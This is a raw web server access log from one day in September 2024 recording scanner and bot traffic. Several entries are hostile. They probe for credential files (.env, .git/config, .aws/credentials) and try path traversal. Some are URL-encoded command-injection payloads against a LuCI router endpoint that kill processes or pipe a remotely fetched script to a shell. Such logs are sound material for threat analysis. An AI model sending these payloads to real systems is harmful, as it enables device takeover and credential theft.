206.168.34.194 - - [23/Sep/2024:05:49:33 +0000] "PRI * HTTP/2.0" 400 226 "-" "-"
71.6.232.23 - - [23/Sep/2024:05:59:06 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
136.144.17.30 - - [23/Sep/2024:06:01:01 +0000] "GET /ab2g HTTP/1.1" 302 - "-" ""
136.144.17.30 - - [23/Sep/2024:06:01:02 +0000] "GET / HTTP/1.1" 200 1401 "-" ""
136.144.17.30 - - [23/Sep/2024:06:01:02 +0000] "GET /ab2h HTTP/1.1" 302 - "-" ""
136.144.17.30 - - [23/Sep/2024:06:01:02 +0000] "GET / HTTP/1.1" 200 1401 "-" ""
149.102.251.11 - - [23/Sep/2024:06:20:10 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 Gecko/20100101 Firefox/91.0"
217.148.140.139 - - [23/Sep/2024:06:20:10 +0000] "GET /58uz HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0) Gecko/20190101 Firefox/77.0"
217.148.140.139 - - [23/Sep/2024:06:20:10 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.10; rv:75.0) Gecko/20100101 Firefox/75.0"
217.148.140.139 - - [23/Sep/2024:06:20:10 +0000] "OPTIONS /janzb HTTP/1.1" 302 - "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.10; rv:75.0) Gecko/20100101 Firefox/75.0"
217.148.140.139 - - [23/Sep/2024:06:20:10 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0) Gecko/20190101 Firefox/77.0"
217.148.140.139 - - [23/Sep/2024:06:20:10 +0000] "GET randomURL HTTP/1.1" 400 226 "-" "-"
217.148.140.139 - - [23/Sep/2024:06:20:11 +0000] "GET beacon.http-get HTTP/1.1" 400 226 "-" "-"
95.214.55.138 - - [23/Sep/2024:06:27:57 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
91.90.42.154 - - [23/Sep/2024:06:35:05 +0000] "\x16\x03" 400 226 "-" "-"
91.90.42.154 - - [23/Sep/2024:06:35:05 +0000] "GET /NZjJ HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/36.0.1985.125 Safari/537.36"
91.90.42.154 - - [23/Sep/2024:06:35:05 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/36.0.1985.125 Safari/537.36"
91.90.42.154 - - [23/Sep/2024:06:35:06 +0000] "GET /rtE2 HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/36.0.1985.125 Safari/537.36"
172.245.21.158 - - [23/Sep/2024:06:35:25 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
172.245.21.158 - - [23/Sep/2024:06:35:25 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
198.235.24.153 - - [23/Sep/2024:06:38:39 +0000] "GET / HTTP/1.0" 200 1401 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
185.191.126.213 - - [23/Sep/2024:07:27:45 +0000] "GET / HTTP/1.1" 200 1401 "-" "-"
172.105.82.111 - - [23/Sep/2024:07:40:01 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
172.105.82.111 - - [23/Sep/2024:07:46:12 +0000] "GET /fwO0 HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Safari/537.36"
172.105.82.111 - - [23/Sep/2024:07:50:41 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
135.125.246.110 - - [23/Sep/2024:07:52:23 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [23/Sep/2024:07:52:23 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
201.217.220.26 - - [23/Sep/2024:08:04:08 +0000] "GET /M7mk HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/42.0 Safari/537.31"
157.66.54.50 - - [23/Sep/2024:08:08:52 +0000] "GET /.git/config HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
135.125.246.110 - - [23/Sep/2024:08:16:23 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [23/Sep/2024:08:16:23 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
216.218.206.66 - - [23/Sep/2024:08:20:50 +0000] "\x16\x03\x01" 400 226 "-" "-"
192.42.116.178 - - [23/Sep/2024:08:35:43 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
149.50.103.48 - - [23/Sep/2024:08:43:29 +0000] "GET / HTTP/1.1" 200 1401 "-" "-"
185.224.128.59 - - [23/Sep/2024:08:52:17 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60for+pid+in+%2Fproc%2F%5B0-9%5D%2A%2F%3B+do+pid%3D%24%7Bpid%25%2F%7D%3B+pid%3D%24%7Bpid%23%23%2A%2F%7D%3B+exe_path%3D%24%28ls+-l+%2Fproc%2F%24pid%2Fexe+2%3E%2Fdev%2Fnull+%7C+awk+%27%7Bprint+%24NF%7D%27%29%3B+if+%5B%5B+%24exe_path+%3D%3D+%2A%2F+%5D%5D%3B+then+kill+-9+%24pid%3B+fi%3B+done%3B%60 HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
185.224.128.59 - - [23/Sep/2024:08:52:18 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60wget+http%3A%2F%2F185.157.247.125%2Fe%2Ft+-O-+%7Csh%3B%60 HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
91.92.249.4 - - [23/Sep/2024:09:02:42 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux i686; rv:16.0) Gecko/20100101 Firefox/16.0"
130.211.98.238 - - [23/Sep/2024:09:58:22 +0000] "\x16\x03\x01" 400 226 "-" "-"
130.211.98.238 - - [23/Sep/2024:09:58:24 +0000] "OPTIONS / HTTP/1.0" 200 1401 "-" "-"
135.125.246.110 - - [23/Sep/2024:10:44:50 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [23/Sep/2024:10:44:50 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
94.156.68.162 - - [23/Sep/2024:11:17:43 +0000] "GET /_profiler/phpinfo HTTP/1.1" 302 - "-" "SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0"
80.82.77.202 - - [23/Sep/2024:11:19:47 +0000] "GET / HTTP/1.0" 200 1401 "-" "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 Nokia6120c/3.70; Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413"
96.126.104.20 - - [23/Sep/2024:11:24:19 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
91.90.42.154 - - [23/Sep/2024:11:29:02 +0000] "\x16\x03" 400 226 "-" "-"
91.90.42.154 - - [23/Sep/2024:11:29:02 +0000] "GET /gSo3 HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;ENXA)"
91.90.42.154 - - [23/Sep/2024:11:29:02 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;ENXA)"
91.90.42.154 - - [23/Sep/2024:11:29:03 +0000] "GET /SafC HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;ENXA)"
93.174.93.12 - - [23/Sep/2024:11:39:19 +0000] "GET / HTTP/1.0" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
172.105.82.111 - - [23/Sep/2024:11:51:54 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
172.105.82.111 - - [23/Sep/2024:11:57:10 +0000] "GET /eSOU HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Safari/537.36"
172.105.82.111 - - [23/Sep/2024:12:01:20 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
185.224.128.83 - - [23/Sep/2024:12:19:45 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60for+pid+in+%2Fproc%2F%5B0-9%5D%2A%2F%3B+do+pid%3D%24%7Bpid%25%2F%7D%3B+pid%3D%24%7Bpid%23%23%2A%2F%7D%3B+exe_path%3D%24%28ls+-l+%2Fproc%2F%24pid%2Fexe+2%3E%2Fdev%2Fnull+%7C+awk+%27%7Bprint+%24NF%7D%27%29%3B+if+%5B%5B+%24exe_path+%3D%3D+%2A%2F+%5D%5D%3B+then+kill+-9+%24pid%3B+fi%3B+done%3B%60 HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
185.224.128.83 - - [23/Sep/2024:12:19:47 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60wget+http%3A%2F%2F185.157.247.125%2Fe%2Ft+-O-+%7Csh%3B%60 HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
135.125.246.110 - - [23/Sep/2024:12:36:18 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [23/Sep/2024:12:36:19 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.62.197.205 - - [23/Sep/2024:12:38:19 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
93.174.93.12 - - [23/Sep/2024:12:38:58 +0000] "\x16\x03\x02\x01o\x01" 400 226 "-" "-"
64.62.197.202 - - [23/Sep/2024:12:40:51 +0000] "GET /favicon.ico HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0"
64.62.197.208 - - [23/Sep/2024:12:41:28 +0000] "GET /geoserver/web/ HTTP/1.1" 302 - "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
185.170.104.53 - - [23/Sep/2024:13:00:16 +0000] "GET /lCkB HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)"
135.125.246.189 - - [23/Sep/2024:13:28:58 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [23/Sep/2024:13:28:58 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
91.90.42.154 - - [23/Sep/2024:13:49:02 +0000] "\x16\x03" 400 226 "-" "-"
91.90.42.154 - - [23/Sep/2024:13:49:02 +0000] "GET /n8Bt HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0) LBBROWSER"
91.90.42.154 - - [23/Sep/2024:13:49:02 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0) LBBROWSER"
91.90.42.154 - - [23/Sep/2024:13:49:03 +0000] "GET /gu6K HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0) LBBROWSER"
123.187.240.242 - - [23/Sep/2024:13:54:21 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
79.124.8.107 - - [23/Sep/2024:13:55:01 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0"
13.58.97.162 - - [23/Sep/2024:13:58:33 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
34.140.8.33 - - [23/Sep/2024:14:15:39 +0000] "GET / HTTP/1.1" 200 1401 "-" "python-requests/2.32.2"
135.125.246.189 - - [23/Sep/2024:14:27:33 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.66.54.194 - - [23/Sep/2024:14:27:34 +0000] "GET /.s3cfg HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
157.66.54.194 - - [23/Sep/2024:14:27:34 +0000] "GET /.boto HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
157.66.54.194 - - [23/Sep/2024:14:27:34 +0000] "GET /.aws/config HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
157.66.54.194 - - [23/Sep/2024:14:27:34 +0000] "GET /.aws/credentials HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
135.125.246.189 - - [23/Sep/2024:14:27:34 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
172.105.82.111 - - [23/Sep/2024:14:32:13 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
192.42.116.192 - - [23/Sep/2024:14:35:08 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0"
172.105.82.111 - - [23/Sep/2024:14:38:48 +0000] "GET /FJZr HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Safari/537.36"
172.105.82.111 - - [23/Sep/2024:14:43:06 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
91.92.243.155 - - [23/Sep/2024:14:57:30 +0000] "GET /_profiler/phpinfo HTTP/1.1" 302 - "-" "Mozilla/5.0 (Linux; Android 8.1.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
20.33.41.25 - - [23/Sep/2024:15:03:50 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.33.41.25 - - [23/Sep/2024:15:03:50 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
35.225.109.87 - - [23/Sep/2024:15:04:36 +0000] "GET / HTTP/1.0" 200 1401 "-" "-"
35.225.109.87 - - [23/Sep/2024:15:07:09 +0000] "GET / HTTP/1.0" 200 1401 "-" "-"
35.225.109.87 - - [23/Sep/2024:15:07:09 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
35.225.109.87 - - [23/Sep/2024:15:07:09 +0000] "GET /evox/about HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
35.225.109.87 - - [23/Sep/2024:15:07:09 +0000] "POST /sdk HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
35.225.109.87 - - [23/Sep/2024:15:07:10 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
35.225.109.87 - - [23/Sep/2024:15:07:10 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
35.225.109.87 - - [23/Sep/2024:15:07:10 +0000] "GET /HNAP1 HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
35.225.109.87 - - [23/Sep/2024:15:07:32 +0000] "GET / HTTP/1.0" 200 1401 "-" "-"
35.225.109.87 - - [23/Sep/2024:15:07:32 +0000] "GET / HTTP/1.1" 200 1401 "-" "-"
79.124.8.107 - - [23/Sep/2024:15:18:37 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0"
93.174.93.12 - - [23/Sep/2024:15:22:43 +0000] "GET / HTTP/1.0" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36 OPR/47.0.2631.55"
185.224.128.47 - - [23/Sep/2024:15:25:52 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
185.224.128.47 - - [23/Sep/2024:16:03:01 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
178.211.139.188 - - [23/Sep/2024:16:15:39 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
43.159.128.149 - - [23/Sep/2024:16:26:32 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
213.136.68.154 - - [23/Sep/2024:17:21:15 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
135.125.246.189 - - [23/Sep/2024:17:42:43 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [23/Sep/2024:17:42:43 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.42.116.179 - - [23/Sep/2024:17:47:04 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
5.188.86.25 - - [23/Sep/2024:18:01:23 +0000] "GET /.env HTTP/1.1" 302 - "-" "Go-http-client/1.1"
178.255.151.130 - - [23/Sep/2024:18:04:52 +0000] "GET /AaPj HTTP/1.1" 302 - "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
181.119.160.58 - - [23/Sep/2024:18:04:52 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
198.235.24.244 - - [23/Sep/2024:18:22:53 +0000] "GET / HTTP/1.0" 200 1401 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
135.125.246.189 - - [23/Sep/2024:18:28:44 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [23/Sep/2024:18:28:44 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
172.168.41.211 - - [23/Sep/2024:18:33:18 +0000] "GET /ReportServer HTTP/1.1" 302 - "-" "Mozilla/5.0 zgrab/0.x"
91.90.42.154 - - [23/Sep/2024:18:33:25 +0000] "\x16\x03" 400 226 "-" "-"
91.90.42.154 - - [23/Sep/2024:18:33:25 +0000] "GET /hZGS HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; MAAU; NP08)"
91.90.42.154 - - [23/Sep/2024:18:33:25 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; MAAU; NP08)"
91.90.42.154 - - [23/Sep/2024:18:33:25 +0000] "GET /wC0s HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; MAAU; NP08)"
94.102.49.71 - - [23/Sep/2024:19:07:38 +0000] "GET / HTTP/1.0" 200 1401 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/"
149.50.103.48 - - [23/Sep/2024:19:15:56 +0000] "GET / HTTP/1.1" 200 1401 "-" "-"
213.136.68.154 - - [23/Sep/2024:20:22:39 +0000] "GET /../js/login.js HTTP/1.1" 400 226 "-" "Go-http-client/1.1"
213.136.68.154 - - [23/Sep/2024:20:22:40 +0000] "GET /../js/brand.js HTTP/1.1" 400 226 "-" "Go-http-client/1.1"
93.140.148.149 - - [23/Sep/2024:20:30:16 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.224.128.83 - - [23/Sep/2024:20:34:58 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60for+pid+in+%2Fproc%2F%5B0-9%5D%2A%2F%3B+do+pid%3D%24%7Bpid%25%2F%7D%3B+pid%3D%24%7Bpid%23%23%2A%2F%7D%3B+exe_path%3D%24%28ls+-l+%2Fproc%2F%24pid%2Fexe+2%3E%2Fdev%2Fnull+%7C+awk+%27%7Bprint+%24NF%7D%27%29%3B+if+%5B%5B+%24exe_path+%3D%3D+%2A%2F+%5D%5D%3B+then+kill+-9+%24pid%3B+fi%3B+done%3B%60 HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
185.224.128.83 - - [23/Sep/2024:20:34:59 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60wget+http%3A%2F%2F185.157.247.125%2Fe%2Ft+-O-+%7Csh%3B%60 HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
91.90.42.154 - - [23/Sep/2024:20:50:32 +0000] "\x16\x03" 400 226 "-" "-"
91.90.42.154 - - [23/Sep/2024:20:50:32 +0000] "GET /iTk4 HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"
91.90.42.154 - - [23/Sep/2024:20:50:32 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"
91.90.42.154 - - [23/Sep/2024:20:50:32 +0000] "GET /SiNS HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"
157.245.77.56 - - [23/Sep/2024:21:04:14 +0000] "\x16\x03\x03\x01\xa5\x01" 400 226 "-" "-"
157.245.77.56 - - [23/Sep/2024:21:04:14 +0000] "\x16\x03\x03\x01\xa5\x01" 400 226 "-" "-"
157.245.77.56 - - [23/Sep/2024:21:04:15 +0000] "\x16\x03\x03\x01V\x01" 400 226 "-" "-"
157.245.77.56 - - [23/Sep/2024:21:04:15 +0000] "\x16\x03\x03\x01H\x01" 400 226 "-" "-"
157.245.77.56 - - [23/Sep/2024:21:04:15 +0000] "\x16\x03\x03\x01\x99\x01" 400 226 "-" "-"
157.245.77.56 - - [23/Sep/2024:21:04:15 +0000] "\x16\x03\x02\x01\x9a\x01" 400 226 "-" "-"
157.245.77.56 - - [23/Sep/2024:21:04:15 +0000] "\x16\x03\x01\x01\xa7\x01" 400 226 "-" "-"
157.245.77.56 - - [23/Sep/2024:21:04:15 +0000] "\x16\x03\x01\x01\xa7\x01" 400 226 "-" "-"
157.245.77.56 - - [23/Sep/2024:21:04:16 +0000] "\x16\x03\x01\x01\x9d\x01" 400 226 "-" "-"
157.245.77.56 - - [23/Sep/2024:21:04:16 +0000] "\x16\x03\x01\x01\xb4\x01" 400 226 "-" "-"
157.245.77.56 - - [23/Sep/2024:21:04:47 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
157.245.77.56 - - [23/Sep/2024:21:05:06 +0000] "GET / HTTP/1.1" 200 1401 "-" "HTTP Banner Detection (https://security.ipip.net)"
135.125.246.189 - - [23/Sep/2024:21:05:09 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [23/Sep/2024:21:05:09 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.245.77.56 - - [23/Sep/2024:21:05:39 +0000] "GET /favicon.ico HTTP/1.1" 302 - "-" "HTTP Banner Detection (https://security.ipip.net)"
157.245.77.56 - - [23/Sep/2024:21:05:50 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
157.245.77.56 - - [23/Sep/2024:21:06:12 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
94.156.68.162 - - [23/Sep/2024:21:30:33 +0000] "GET /.git/config HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36 OPR/62.0.3331.72"
135.125.246.189 - - [23/Sep/2024:21:32:23 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [23/Sep/2024:21:32:23 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
